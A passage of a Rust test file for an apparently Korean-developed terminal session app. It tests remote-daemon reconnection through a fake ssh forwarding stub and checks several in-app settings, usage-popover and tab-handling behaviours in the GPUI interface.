                                )
                                .ok();
                            ipc::read_frame(&mut c.stream).ok();
                        }
                    }
                }
            }
            thread::sleep(Duration::from_millis(150));
            self.local_holder.kill().ok();
            self.local_holder.wait().ok();
            self.remote_holder.kill().ok();
            self.remote_holder.wait().ok();
            for pid in daemons {
                Command::new("/bin/kill")
                    .args(["-9", &pid.to_string()])
                    .status()
                    .ok();
            }
            fs::remove_dir_all(&self.base_dir).ok();
        }
    }

    let wait = Duration::from_secs(15);
    let exe = std::env::current_exe().unwrap();
    let bin_dir = exe
        .parent()
        .and_then(Path::parent)
        .expect("target/debug directory");
    let mk_bin = bin_dir.join("krill");
    let holder_bin = bin_dir.join("krill-holder");
    let krilld_bin = bin_dir.join("krilld");
    if !mk_bin.exists() || !holder_bin.exists() || !krilld_bin.exists() {
        let status = Command::new(env!("CARGO"))
            .args([
                "build",
                "--locked",
                "--bins",
                "-p",
                "krill",
                "-p",
                "krill-holder",
                "-p",
                "krilld",
            ])
            .status()
            .unwrap();
        assert!(status.success(), "building helper binaries failed");
    }

    // macOS UDS 104바이트 제한 안에 들도록 짧은 임시 경로를 쓴다.
    let base_dir = std::env::temp_dir().join(format!("m131-{}", std::process::id()));
    fs::remove_dir_all(&base_dir).ok();
    let local_dir = base_dir.join("l");
    let remote_dir = base_dir.join("r");
    let tunnel_dir = base_dir.join("t");
    fs::create_dir_all(&local_dir).unwrap();
    fs::create_dir_all(&remote_dir).unwrap();
    fs::create_dir_all(&tunnel_dir).unwrap();

    let local_sock = local_dir.join("run/krilld.sock");
    let remote_sock = remote_dir.join("run/krilld.sock");

    let spawn_holder = |state: &Path, sock: &Path| -> Child {
        Command::new(&holder_bin)
            .arg(&krilld_bin)
            .arg(sock)
            .env("KRILL_STATE_DIR", state)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .unwrap()
    };

    let local_holder = spawn_holder(&local_dir, &local_sock);
    let remote_holder = spawn_holder(&remote_dir, &remote_sock);
    let _guard = DaemonGuard {
        local_holder,
        remote_holder,
        base_dir: base_dir.clone(),
    };

    let wait_daemon = |sock: &Path, label: &str| -> u32 {
        let deadline = Instant::now() + wait;
        loop {
            if let Ok(c) = handshake(sock, &client_hello(ClientRole::App, label), wait) {
                return u32::try_from(c.server.instance_id).unwrap();
            }
            assert!(
                Instant::now() < deadline,
                "{label} daemon startup timed out"
            );
            thread::sleep(Duration::from_millis(20));
        }
    };

    let local_pid = wait_daemon(&local_sock, "mk131-local");
    let remote_pid_1 = wait_daemon(&remote_sock, "mk131-remote");
    assert_ne!(local_pid, remote_pid_1);

    // 가짜 ssh 포워더: `-L <local>:<remote>` 인자를 받아 `krill __forward`로 원격 krilld 소켓에 프록시한다.
    let fake_ssh = base_dir.join("fake-ssh.sh");
    let ssh_log = base_dir.join("ssh-argv");
    let ssh_errors = base_dir.join("ssh-stderr");
    fs::write(
        &fake_ssh,
        format!(
            "#!/bin/sh\n\
             printf '%s\\n' \"$@\" >> '{}'\n\
             fwd=\"\"\n\
             prev=\"\"\n\
             for a in \"$@\"; do\n\
               if [ \"$prev\" = \"-L\" ]; then fwd=\"$a\"; fi\n\
               prev=\"$a\"\n\
             done\n\
             local_s=\"${{fwd%%:*}}\"\n\
             remote_s=\"${{fwd#*:}}\"\n\
             if [ -z \"$fwd\" ] || [ \"$local_s\" = \"$fwd\" ]; then exit 2; fi\n\
             exec '{}' __forward \"$local_s\" \"$remote_s\" 2>> '{}'\n",
            ssh_log.display(),
            mk_bin.display(),
            ssh_errors.display()
        ),
    )
    .unwrap();
    fs::set_permissions(&fake_ssh, fs::Permissions::from_mode(0o755)).unwrap();

    let local_paths = Paths {
        socket: local_sock.clone(),
        holder: holder_bin.clone(),
        krilld: krilld_bin.clone(),
    };
    let local_target = HostTarget::local(local_paths.clone());
    assert!(local_target.allow_local_launch());

    let manager = HostManager::with_ssh_program(tunnel_dir.clone(), fake_ssh.into_os_string());
    let remote_spec = RemoteHostSpec {
        id: "studio".into(),
        label: "Mac Studio".into(),
        address: "owen@studio.local".into(),
        port: Some(2222),
        identity_file: Some("/tmp/key with spaces".into()),
        remote_socket: Some(remote_sock.to_string_lossy().into_owned()),
    };
    manager.sync_specs(std::slice::from_ref(&remote_spec));
    let remote_host_id = HostId::Remote("studio".into());
    let remote_target = manager
        .target_for(&remote_host_id, Some(&local_paths))
        .unwrap();
    assert!(!remote_target.allow_local_launch());

    // 1. 내 Mac과 원격 호스트 각각에 셸 세션을 띄운다.
    let sh_create = |cwd: &Path| Create {
        account: None,
        program: Program::Custom {
            program: b"/usr/bin/env".to_vec(),
            args: vec![
                b"HISTFILE=/dev/null".to_vec(),
                b"PS1=$ ".to_vec(),
                b"/bin/sh".to_vec(),
            ],
        },
        cwd: cwd.as_os_str().as_bytes().to_vec(),
        cols: 80,
        rows: 24,
    };
    let pane::Found::Live(local_sid, true) =
        pane::ensure_session_in(&local_target, None, &sh_create(&local_dir)).unwrap()
    else {
        panic!("expected new local session");
    };
    let pane::Found::Live(remote_sid, true) =
        pane::ensure_session_in(&remote_target, None, &sh_create(&remote_dir)).unwrap_or_else(
            |err| {
                panic!(
                    "remote session failed: {err}; argv: {:?}; stderr: {:?}",
                    fs::read_to_string(&ssh_log),
                    fs::read_to_string(&ssh_errors)
                );
            },
        )
    else {
        panic!("expected new remote session");
    };
    assert_eq!(manager.status("studio"), HostStatus::Connected);
    assert_eq!(manager.tunnel_starts("studio"), 1);
    let argv = fs::read_to_string(&ssh_log).unwrap();
    assert!(
        argv.contains("-p\n2222\n-i\n/tmp/key with spaces\n"),
        "{argv}"
    );
    assert!(argv.contains("-N\n-L\n"), "{argv}");
    assert!(argv.contains("ServerAliveInterval=15\n"), "{argv}");
    assert!(
        !argv.contains("$HOME"),
        "explicit socket must skip HOME query: {argv}"
    );

    // 2. 두 호스트의 `sidebar::status_source` 스냅샷이 각각 세션을 가져오고,
    //    영속 터널 재사용으로 `tunnel_starts`는 여전히 1이어야 한다.
    let local_source = sidebar::status_source(local_target.clone());
    let remote_source = sidebar::status_source(remote_target.clone());
    let local_snap = local_source.fetch().unwrap();
    let remote_snap = remote_source.fetch().unwrap();
    assert!(local_snap.sessions.iter().any(|s| s.id == local_sid));
    assert!(remote_snap.sessions.iter().any(|s| s.id == remote_sid));
    assert_eq!(
        manager.tunnel_starts("studio"),
        1,
        "sidebar polling and session creation must share a single persistent tunnel"
    );

    // 3. 내 Mac 패인과 원격 패인에 붙어 각각 명령을 보내고 출력을 확인한다.
    let attach_live = |target: &HostTarget,
                       sid: krill_proto::SessionId,
                       pane_model: &mut Pane<pane::Writer>|
     -> mpsc::Receiver<(u8, Vec<u8>)> {
        let known = pane_model.known(sid);
        let linked = pane::attach(target, sid, known).unwrap();
        let _ = pane_model.link(
            sid,
            linked.instance,
            linked.writer,
            linked.features,
            Now::get(),
        );
        let (tx, rx) = mpsc::channel();
        let mut reader = linked.reader;
        thread::spawn(move || {
            while let Ok(Some(f)) = ipc::read_frame(&mut reader) {
                if tx.send(f).is_err() {
                    break;
                }
            }
        });
        rx
    };

    let screen_contains = |pane_model: &Pane<pane::Writer>, needle: &str| -> bool {
        pane_model.shown().rows.iter().any(|r| {
            let line: String = r.iter().map(|c| c.ch).collect();
            line.contains(needle)
        })
    };

    let wait_until =
        |pane_model: &mut Pane<pane::Writer>, rx: &mpsc::Receiver<(u8, Vec<u8>)>, needle: &str| {
            let deadline = Instant::now() + wait;
            while !screen_contains(pane_model, needle) {
                let rem = deadline.saturating_duration_since(Instant::now());
                assert!(!rem.is_zero(), "timed out waiting for {needle:?}");
                let (k, b) = rx.recv_timeout(rem).expect("stream closed before needle");
                pane_model.frame(k, &b).unwrap();
            }
        };

    let mut local_pane = Pane::default();
    let local_rx = attach_live(&local_target, local_sid, &mut local_pane);
    let mut remote_pane = Pane::default();
    let remote_rx = attach_live(&remote_target, remote_sid, &mut remote_pane);

    assert_eq!(
        local_pane.input(b"printf '%s%s\\n' LOCAL_ BEFORE_KILL\n", Now::get()),
        None
    );
    assert_eq!(
        remote_pane.input(
            b"survived=REMOTE; printf '%s%s\\n' \"$survived\" _BEFORE_KILL\n",
            Now::get()
        ),
        None
    );
    wait_until(&mut local_pane, &local_rx, "LOCAL_BEFORE_KILL");
    wait_until(&mut remote_pane, &remote_rx, "REMOTE_BEFORE_KILL");

    // 4. 원격 `krilld`를 `kill -9` 한다.
    assert!(
        Command::new("/bin/kill")
            .args(["-9", &remote_pid_1.to_string()])
            .status()
            .unwrap()
            .success()
    );

    // 5. 원격 `krilld`가 죽은 직후에도 내 Mac 세션은 전혀 영향받지 않고 즉시 응답한다.
    assert_eq!(
        local_pane.input(
            b"printf '%s%s\\n' LOCAL_ UNAFFECTED_BY_REMOTE_KILL\n",
            Now::get()
        ),
        None
    );
    wait_until(
        &mut local_pane,
        &local_rx,
        "LOCAL_UNAFFECTED_BY_REMOTE_KILL",
    );

    // 6. 원격 `krill-holder`가 원격 `krilld`를 재기동하면, 영속 터널(`remote_target`)을 통해
    //    원격 패인이 자동 재연결·재동기화(`Known`)되어 이전 출력(`REMOTE_BEFORE_KILL`)을 유지하고
    //    새 입력(`REMOTE_AFTER_RECONNECT`)도 정상 반영된다.
    let deadline = Instant::now() + wait;
    let remote_pid_2 = loop {
        if let Ok(c) = remote_target.connect(&client_hello(ClientRole::App, "mk131-reconnected")) {
            let pid = u32::try_from(c.server.instance_id).unwrap();
            if pid != remote_pid_1 {
                break pid;
            }
        }
        assert!(
            Instant::now() < deadline,
            "remote krilld did not restart behind holder"
        );
        thread::sleep(Duration::from_millis(30));
    };
    assert_ne!(remote_pid_1, remote_pid_2);

    let _ = remote_pane.unlink();
    let remote_rx = attach_live(&remote_target, remote_sid, &mut remote_pane);
    assert_eq!(
        remote_pane.input(
            b"printf '%s%s\\n' \"$survived\" _AFTER_RECONNECT\n",
            Now::get()
        ),
        None
    );
    wait_until(&mut remote_pane, &remote_rx, "REMOTE_AFTER_RECONNECT");
    assert!(
        screen_contains(&remote_pane, "REMOTE_BEFORE_KILL"),
        "resynced remote pane must preserve screen content from before remote krilld kill -9"
    );
    assert_eq!(
        manager.tunnel_starts("studio"),
        1,
        "remote krilld restart behind live forwarder must reuse the existing tunnel"
    );

    // 7. 터널이 강제 종료된 뒤(`kill_tunnel`) 재연결 시 지수 백오프 후 새 터널을 띄워 다시 붙는다.
    manager.kill_tunnel("studio");
    assert_eq!(manager.status("studio"), HostStatus::Disconnected);
    thread::sleep(HostManager::backoff_delay(1) + Duration::from_millis(20));
    let remote_target_2 = manager
        .target_for(&remote_host_id, Some(&local_paths))
        .unwrap();
    let snap_after = sidebar::status_source(remote_target_2).fetch().unwrap();
    assert!(snap_after.sessions.iter().any(|s| s.id == remote_sid));
    assert_eq!(manager.status("studio"), HostStatus::Connected);
    assert_eq!(manager.tunnel_starts("studio"), 2);
}

#[gpui::test]
fn settings_view_switches_in_app_without_second_window_and_preserves_sessions(
    cx: &mut TestAppContext,
) {
    use krill_proto::input::Input;
    use krill_proto::screen::Msg as _;

    let layout = state_path("in-app-settings");
    let state_dir = layout.parent().unwrap().to_path_buf();
    let (view, cx) = open(cx, layout);
    let pane = layout_of(&view, cx).active_tab().focused;
    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs.set_nonblocking(true).unwrap();

    cx.update(|_, cx| {
        krill_app::settings::init_at(Some(state_dir), cx);
        view.update(cx, |s, cx| {
            s.layout.set_session(pane, krill_proto::SessionId(51));
            s.attach_test(pane, krill_proto::SessionId(51), ours, cx);
        });
    });
    cx.simulate_resize(gpui::size(px(1400.), px(900.)));
    cx.run_until_parked();
    assert_eq!(cx.windows().len(), 1);
    assert!(cx.debug_bounds("admin-center").is_none());
    assert!(cx.debug_bounds("titlebar").is_some());

    // 1. Clicking sidebar settings button opens Admin Center in-place in the same window.
    let btn = cx
        .debug_bounds("sidebar-settings")
        .expect("sidebar-settings button");
    cx.simulate_click(btn.center(), Modifiers::default());
    cx.run_until_parked();
    assert_eq!(cx.windows().len(), 1, "must not open a second OS window");
    assert!(cx.debug_bounds("admin-center").is_some());
    assert!(
        cx.debug_bounds("titlebar").is_none(),
        "workspace tab bar is replaced while Settings is active"
    );
    assert!(
        cx.debug_bounds("status-bar-left").is_some(),
        "status bar stays anchored at the bottom"
    );
    assert!(cx.update(|_, cx| view.read(cx).live.contains_key(&pane)));

    // 2. Terminal workspace shortcuts (Cmd-K clear, Cmd-V paste, Cmd-W close pane, Cmd-D split)
    //    must not leak to the hidden PTY or mutate hidden terminal panes while Settings is open.
    cx.update(|_, cx| {
        cx.write_to_clipboard(ClipboardItem::new_string("leaked-clipboard".into()));
    });
    cx.simulate_keystrokes("cmd-k cmd-v cmd-w cmd-d");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).tabs().len(), 1);
    assert_eq!(layout_of(&view, cx).visible().len(), 1);
    assert!(
        cx.debug_bounds("admin-center").is_some(),
        "Settings view remains open and hidden terminal pane is untouched"
    );

    // Cmd-F inside in-app Settings focuses search input; typing does not leak to the PTY.
    cx.simulate_keystrokes("cmd-f t h e m e");
    cx.run_until_parked();
    assert!(
        matches!(
            krill_proto::ipc::read_frame(&mut theirs),
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock
        ),
        "keystrokes in Settings must never leak to the terminal PTY"
    );

    // 3. First Escape clears the non-empty search query while staying in Settings;
    //    second Escape closes Settings and restores workspace focus.
    cx.simulate_keystrokes("escape");
    cx.run_until_parked();
    assert!(
        cx.debug_bounds("admin-center").is_some(),
        "first Escape only clears non-empty search query"
    );
    cx.simulate_keystrokes("escape");
    cx.run_until_parked();
    assert!(
        cx.debug_bounds("admin-center").is_none(),
        "second Escape returns to workspace"
    );
    assert!(cx.debug_bounds("titlebar").is_some());

    // 4. open_window_at_tab(AdminTab::Accounts) switches to in-app Settings on the Accounts tab,
    //    and clicking "Back to app" returns to the workspace with the live terminal intact.
    cx.update(|_, cx| {
        krill_app::settings::open_window_at_tab(krill_app::settings::AdminTab::Accounts, cx);
    });
    cx.run_until_parked();
    assert_eq!(cx.windows().len(), 1);
    assert!(cx.debug_bounds("admin-center").is_some());
    assert!(cx.debug_bounds("admin-accounts-refresh").is_some());

    let back = cx
        .debug_bounds("admin-back-to-app")
        .expect("admin-back-to-app button");
    cx.simulate_click(back.center(), Modifiers::default());
    cx.run_until_parked();
    assert!(cx.debug_bounds("admin-center").is_none());
    assert!(cx.debug_bounds("titlebar").is_some());
    assert!(cx.update(|_, cx| view.read(cx).live.contains_key(&pane)));

    // 5. After returning from Settings, typing in the workspace reaches the live PTY again.
    cx.simulate_keystrokes("x");
    cx.run_until_parked();
    let (k, b) = krill_proto::ipc::read_frame(&mut theirs).unwrap().unwrap();
    assert_eq!(Input::decode(k, &b).unwrap().bytes, b"x");
}

#[gpui::test]
fn status_provider_usage_menu_renders_orca_progress_bars_and_opens_in_app_accounts_tab(
    cx: &mut TestAppContext,
) {
    use krill_proto::usage::{
        AccountInfo, AccountsSnapshot, AutoSwitchMetric, AutoSwitchPolicy, AutoSwitchRule,
        ProviderKind, Snapshot, Window,
    };

    let layout = state_path("provider-usage-menu");
    let state_dir = layout.parent().unwrap().to_path_buf();
    let (view, cx) = open(cx, layout);
    cx.update(|_, cx| {
        krill_app::settings::init_at(Some(state_dir), cx);
    });
    cx.run_until_parked();
    cx.update(|_, cx| {
        view.update(cx, |shell, cx| {
            shell.accounts_snapshot = AccountsSnapshot {
                accounts: vec![
                    AccountInfo {
                        id: "work".into(),
                        provider: ProviderKind::Claude,
                        label: "Work Max".into(),
                        email: Some("owen@work.dev".into()),
                        profile_dir: "/tmp/claude-work".into(),
                        active: false,
                        host_default: false,
                        stale: false,
                        usage: Snapshot {
                            five_hour: Some(Window {
                                percent: 12,
                                resets_at: Some("3h 10m".into()),
                            }),
                            seven_day: Some(Window {
                                percent: 25,
                                resets_at: Some("4d 2h".into()),
                            }),
                        },
                    },
                    AccountInfo {
                        id: "host_default".into(),
                        provider: ProviderKind::Claude,
                        label: "시스템 기본값 (~/.claude)".into(),
                        email: Some("alice@example.dev".into()),
                        profile_dir: "/Users/alice/.claude".into(),
                        active: true,
                        host_default: true,
                        stale: false,
                        usage: Snapshot {
                            five_hour: Some(Window {
                                percent: 64,
                                resets_at: Some("1h 45m".into()),
                            }),
                            seven_day: Some(Window {
                                percent: 41,
                                resets_at: Some("5d 8h".into()),
                            }),
                        },
                    },
                ],
                auto_switch: AutoSwitchPolicy {
                    enabled: true,
                    threshold_percent: 90,
                    rules: vec![AutoSwitchRule {
                        provider: ProviderKind::Claude,
                        from_account_id: "host_default".into(),
                        enabled: true,
                        threshold_percent: 85,
                        metric: AutoSwitchMetric::FiveHour,
                        target_account_id: Some("work".into()),
                    }],
                    ..Default::default()
                },
                switched: Vec::new(),
                // OWE-703 1단계: 상태 꼬리는 데몬 스냅샷에만 있다(테스트 픽스처는 모름).
                statuses: Vec::new(),
                advanced: krill_proto::usage::AccountPolicyState::default(),
                connections: Box::default(),
            };
            cx.notify();
        });
    });
    cx.simulate_resize(gpui::size(px(1800.), px(900.)));
    cx.run_until_parked();

    let pill = cx
        .debug_bounds("status-provider-pill-claude")
        .expect("Claude provider pill");
    cx.simulate_click(pill.center(), Modifiers::default());
    cx.run_until_parked();

    for selector in [
        "status-provider-card-claude",
        "status-provider-bar-claude-5h",
        "status-provider-bar-claude-7d",
        "status-provider-account-claude-host_default",
        "status-provider-account-claude-work",
        "status-provider-open-accounts",
    ] {
        assert!(
            cx.debug_bounds(selector).is_some(),
            "missing Orca provider popover element: {selector}"
        );
    }

    // host_default must be sorted above other accounts.
    let host_row = cx
        .debug_bounds("status-provider-account-claude-host_default")
        .unwrap();
    let work_row = cx
        .debug_bounds("status-provider-account-claude-work")
        .unwrap();
    assert!(
        host_row.top() < work_row.top(),
        "host_default account row must appear before secondary accounts: {host_row:?} vs {work_row:?}"
    );

    // Clicking "Open Accounts settings..." closes the popover and switches to the in-app Accounts tab.
    let open_accounts = cx.debug_bounds("status-provider-open-accounts").unwrap();
    cx.simulate_click(open_accounts.center(), Modifiers::default());
    cx.run_until_parked();
    assert_eq!(cx.windows().len(), 1);
    assert!(cx.debug_bounds("admin-center").is_some());
    assert!(cx.debug_bounds("admin-accounts-refresh").is_some());
}

/// AS-20: 닫기 버튼·가운데 버튼 모두 단축키와 같은 세션 복원 이력을 남긴다.
#[gpui::test]
fn pointer_closed_tabs_reopen_the_original_session(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("pointer-reopen"));
    for middle in [false, true] {
        cx.simulate_keystrokes("cmd-t");
        let pane = layout_of(&view, cx).active_tab().focused;
        let session = krill_proto::SessionId(if middle { 702 } else { 701 });
        cx.update(|_, cx| {
            view.update(cx, |s, cx| {
                s.layout.set_session(pane, session);
                cx.notify();
            });
        });
        cx.run_until_parked();
        assert_eq!(layout_of(&view, cx).active(), if middle { 2 } else { 1 });
        if middle {
            let bounds = cx.debug_bounds("session-tab-2").unwrap();
            cx.simulate_mouse_down(bounds.center(), MouseButton::Middle, Modifiers::default());
            cx.simulate_mouse_up(bounds.center(), MouseButton::Middle, Modifiers::default());
        } else {
            let bounds = cx.debug_bounds("close-tab-1").unwrap();
            cx.simulate_click(bounds.center(), Modifiers::default());
        }
        cx.run_until_parked();
        assert!(!layout_of(&view, cx).visible().contains(&pane));
        assert_eq!(cx.update(|_, cx| view.read(cx).closed_sessions.len()), 1);
        cx.simulate_keystrokes("cmd-shift-t");
        let reopened = layout_of(&view, cx);
        assert_eq!(
            reopened.session(reopened.active_tab().focused),
            Some(session)
        );
    }
}

/// 설정 화면에 가려진 터미널은 보고 있는 세션으로 취급하지 않는다.
#[gpui::test]
fn settings_page_keeps_hidden_terminal_completion_unread(cx: &mut TestAppContext) {
    use krill_proto::{
        SessionId,
        control::{AgentState, AgentStatus},
    };
    #[derive(Clone)]
    struct Dynamic(Arc<std::sync::Mutex<sidebar::Snapshot>>);
    impl sidebar::Source for Dynamic {
        fn fetch(&self) -> std::io::Result<sidebar::Snapshot> {
            Ok(self.0.lock().unwrap().clone())
        }
    }
    let source = Dynamic(Arc::new(std::sync::Mutex::new(sidebar::Snapshot {
        sessions: vec![sidebar::Session {
            id: SessionId(799),
            status: AgentStatus {
                state: AgentState::Working,
                ..AgentStatus::UNKNOWN
            },
            worktree: None,
            cwd: None,
            account: None,
        }],
        ..sidebar::Snapshot::default()
    })));
    let (view, cx) = open(cx, state_path("settings-unread"));
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            let pane = s.layout.active_tab().focused;
            s.change(false, cx, |l| {
                l.set_session(pane, SessionId(799));
            });
            s.sidebar
                .update(cx, |sb, cx| sb.connect_source(Arc::new(source.clone()), cx));
        });
    });
    cx.run_until_parked();
    cx.update(|window, cx| {
        view.update(cx, |s, cx| {
            s.open_settings(krill_app::settings::AdminTab::General, Some(window), cx);
        });
    });
    cx.run_until_parked();
    source.0.lock().unwrap().sessions[0].status.state = AgentState::Done;
    cx.executor().advance_clock(Duration::from_millis(501));
    cx.run_until_parked();
    assert!(cx.update(|_, cx| view.read(cx).sidebar.read(cx).is_unread(SessionId(799))));
    cx.update(|window, cx| view.update(cx, |s, cx| s.close_settings(Some(window), cx)));
    cx.run_until_parked();
    assert!(!cx.update(|_, cx| view.read(cx).sidebar.read(cx).is_unread(SessionId(799))));
}

/// 기본 탭(마지막 남은 탭)도 닫기 버튼·단축키로 모두 닫혀 탭 0개 상태가 되고, 새 세션을 자동 생성하지 않는다.
#[gpui::test]
fn default_tab_can_be_closed_leaving_zero_tabs(cx: &mut TestAppContext) {
    let path = state_path("close-default-tab");
    let (view, cx) = open(cx, path.clone());
    let session = krill_proto::SessionId(801);
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            let pane = s.layout.active_tab().focused;
            s.layout.set_session(pane, session);
            cx.notify();
        });
    });
    cx.run_until_parked();

    // 기본 탭 닫기 버튼 클릭 → 탭 0개, 살아 있는 연결 0개.
    let close_btn = cx.debug_bounds("close-tab-0").expect("close-tab-0 button");
    cx.simulate_click(close_btn.center(), Modifiers::default());
    cx.run_until_parked();
    let empty = layout_of(&view, cx);
    assert!(empty.tabs().is_empty());
    assert!(empty.visible().is_empty());
    assert!(cx.update(|_, cx| view.read(cx).live.is_empty()));
    assert_eq!(Layout::load(&path).unwrap(), empty);

    // 빈 탭 상태에서 닫기·분할·탭 순환 단축키를 눌러도 패닉이나 유령 탭이 생기지 않는다.
    cx.simulate_keystrokes("cmd-w cmd-shift-w cmd-d cmd-shift-] cmd-shift-[");
    cx.run_until_parked();
    assert!(layout_of(&view, cx).tabs().is_empty());

    // Cmd+Shift+T로 방금 닫은 기본 탭 세션을 복원하고, Cmd+W로 다시 마지막 탭을 닫을 수 있다.
    cx.simulate_keystrokes("cmd-shift-t");
    cx.run_until_parked();
    let reopened = layout_of(&view, cx);
    assert_eq!(reopened.tabs().len(), 1);
    assert_eq!(
        reopened.session(reopened.active_tab().focused),
        Some(session)
    );

    // Cmd+W로 다시 마지막 탭을 닫을 수 있다.
    cx.simulate_keystrokes("cmd-w");
    cx.run_until_parked();
    assert!(layout_of(&view, cx).tabs().is_empty());
}

/// 사이드바 상단 네비게이션은 실제로 구현된 '에이전트 대시보드'만 표시하고,
/// 아직 없는 기능(작업·아티팩트·스킬·자동화·모바일)은 표기하지 않는다.
#[gpui::test]
fn sidebar_nav_shows_only_implemented_agent_dashboard(cx: &mut TestAppContext) {
    let (_view, cx) = open(cx, state_path("sidebar-nav-items"));
    cx.run_until_parked();

    assert!(
        cx.debug_bounds("nav-agent-dashboard").is_some(),
        "implemented Agent Dashboard nav item must be rendered"
    );
    for unimplemented in [
        "nav-tasks",
        "nav-artifacts",
        "nav-skills",
        "nav-automations",
        "nav-mobile",
    ] {
        assert!(
            cx.debug_bounds(unimplemented).is_none(),
            "unimplemented sidebar nav item {unimplemented} must not be rendered"
        );
    }
}

/// 여러 `Shell` 창이 열려 있을 때 한 창에서 인앱 설정을 닫으면 해당 창의 설정만 닫히고,
/// 나중에 등록된 다른 `Shell` 창이 닫기 명령을 가로채거나 함께 닫히지 않는다.
#[gpui::test]
fn multi_window_settings_close_targets_matching_shell_host(cx: &mut TestAppContext) {
    let path_a = state_path("multi-settings-a");
    let path_b = state_path("multi-settings-b");
    let state_dir = path_a.parent().unwrap().to_path_buf();
    let (view_a, cx) = open(cx, path_a);
    let view_b = cx.update(|_, cx| {
        krill_app::settings::init_at(Some(state_dir), cx);
        let handle = cx
            .open_window(gpui::WindowOptions::default(), |_, cx| {
                cx.new(|cx| Shell::new(Some(path_b), cx))
            })
            .unwrap();
        handle.update(cx, |_, _, cx| cx.entity()).unwrap()
    });
    cx.simulate_resize(gpui::size(px(1400.), px(900.)));
    cx.run_until_parked();

    // 1. Open settings in window A while window B remains on the terminal workspace.
    let btn = cx
        .debug_bounds("sidebar-settings")
        .expect("sidebar-settings button");
    cx.simulate_click(btn.center(), Modifiers::default());
    cx.run_until_parked();
    assert!(cx.debug_bounds("admin-center").is_some());
    assert!(cx.update(|_, cx| view_a.read(cx).settings.is_some()));
    assert!(cx.update(|_, cx| view_b.read(cx).settings.is_none()));

    // Clicking "Back to app" in window A must close window A's settings (not be swallowed by window B).
    let back = cx
        .debug_bounds("admin-back-to-app")
        .expect("admin-back-to-app button");
    cx.simulate_click(back.center(), Modifiers::default());
    cx.run_until_parked();
    assert!(cx.debug_bounds("admin-center").is_none());
    assert!(cx.update(|_, cx| view_a.read(cx).settings.is_none()));

    // 2. Open settings in both window A and window B, then press Escape in window A:
    //    only window A's settings should close, leaving window B's settings open.
    let btn = cx
        .debug_bounds("sidebar-settings")
        .expect("sidebar-settings button");
    cx.simulate_click(btn.center(), Modifiers::default());
    cx.update(|_, cx| {
        view_b.update(cx, |s, cx| {
            s.open_settings(krill_app::settings::AdminTab::Accounts, None, cx);
        });
    });
    cx.run_until_parked();
    assert!(cx.update(|_, cx| view_a.read(cx).settings.is_some()));
    assert!(cx.update(|_, cx| view_b.read(cx).settings.is_some()));

    cx.simulate_keystrokes("escape");
    cx.run_until_parked();
    assert!(cx.debug_bounds("admin-center").is_none());
    assert!(cx.update(|_, cx| view_a.read(cx).settings.is_none()));
    assert!(
        cx.update(|_, cx| view_b.read(cx).settings.is_some()),
        "closing settings in window A must not close settings in window B"
    );

    // 3. Calling close_settings_page(window, cx) (where view is None) on window A must not be
    //    swallowed by view_b (another window) or an unrendered Shell host (this.window == None).
    let unrendered = cx.update(|window, cx| {
        view_a.update(cx, |s, cx| {
            s.open_settings(krill_app::settings::AdminTab::General, Some(window), cx);
        });
        let unrendered = cx.new(|cx| Shell::new(None, cx));
        unrendered.update(cx, |s, cx| {
            s.open_settings(krill_app::settings::AdminTab::Terminal, None, cx);
        });
        unrendered
    });
    cx.run_until_parked();
    assert!(cx.update(|_, cx| view_a.read(cx).settings.is_some()));
    assert!(cx.update(|_, cx| unrendered.read(cx).window.is_none()));
    assert!(cx.update(|_, cx| unrendered.read(cx).settings.is_some()));
    cx.update(|window, cx| {
        krill_app::settings::close_settings_page(window, cx);
    });
    cx.run_until_parked();
    assert!(
        cx.update(|_, cx| view_a.read(cx).settings.is_none()),
        "close_settings_page on window A must close window A's settings, not be hijacked by unrendered or view_b"
    );
    assert!(
        cx.update(|_, cx| view_b.read(cx).settings.is_some()),
        "view_b's settings must remain untouched"
    );
    assert!(
        cx.update(|_, cx| unrendered.read(cx).settings.is_some()),
        "unrendered host's settings must remain untouched"
    );
    cx.update(|_, cx| {
        unrendered.update(cx, |s, cx| s.close_settings(None, cx));
    });
    drop(unrendered);

    // 4. Triggering open_settings on a WindowRole::Floating Shell must never open SettingsView
    //    inside the floating terminal window itself; it prunes dropped hosts and delegates to
    //    the live Main Shell host.
    cx.update(|_, cx| {
        view_b.update(cx, |s, cx| s.close_settings(None, cx));
        let floating = cx.new(|cx| {
            let mut s = Shell::new(None, cx);
            s.role = super::WindowRole::Floating;
            s
        });
        floating.update(cx, |s, cx| {
            s.open_settings(krill_app::settings::AdminTab::Ssh, None, cx);
        });
        assert!(
            floating.read(cx).settings.is_none(),
            "floating terminal window must never host SettingsView in-place"
        );
    });
    cx.run_until_parked();
    assert!(
        cx.update(|_, cx| {
            view_a.read(cx).settings.is_some() || view_b.read(cx).settings.is_some()
        }),
        "Settings must open in a Main Shell host when triggered from a Floating terminal"
    );
}

/// MK-162: 필수 실패가 있을 때만 상태바에 점검 경고가 뜨고, 없으면 표시되지 않는다.
#[gpui::test]
fn status_bar_warns_only_on_required_check_failure(cx: &mut TestAppContext) {
    use krill_proto::doctor::{Check, Fix, FixKind, Level, Status};
    let fail = Check {
        id: "bin.helpers".to_owned(),
        level: Level::Required,
        status: Status::Fail,
        summary: "bad".to_owned(),
        detail: String::new(),
        fix: Fix {
            kind: FixKind::None,
            value: String::new(),
        },
    };
    let (_, cx) = open(cx, state_path("checks-pill"));
    cx.run_until_parked();
    assert!(cx.debug_bounds("status-checks-warning").is_none());

    cx.update(|_, cx| krill_app::onboarding::store_snapshot(cx, vec![fail]));
    cx.run_until_parked();
    assert!(cx.debug_bounds("status-checks-warning").is_some());

    // 다른 테스트에 새지 않게 비운다.
    cx.update(|_, cx| krill_app::onboarding::store_snapshot(cx, Vec::new()));
    cx.run_until_parked();
    assert!(cx.debug_bounds("status-checks-warning").is_none());
}

/// OWE-734: 탭 우클릭 메뉴에서 탭 고정(`Pin Tab`)·9가지 색상 태그 지정이 동작하고 `layout.bin`에 영속화되며,
/// 고정된 탭에서 `⌘W`/`⇧⌘W`/닫기 버튼을 누르면 확인 가드(`PinnedTabCloseDialog`)가 표시된다.
#[gpui::test]
